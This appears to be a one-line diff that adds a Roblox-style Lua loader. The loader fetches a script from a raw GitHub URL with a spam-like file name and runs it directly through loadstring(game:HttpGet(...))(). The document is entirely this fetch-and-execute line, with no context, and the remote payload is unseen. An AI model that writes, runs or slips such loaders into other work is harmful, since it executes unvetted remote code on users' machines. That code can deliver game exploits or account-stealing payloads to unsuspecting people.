@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/apple-ipad-original-spam6-dpvpqf54o1hzyo.lua"))()
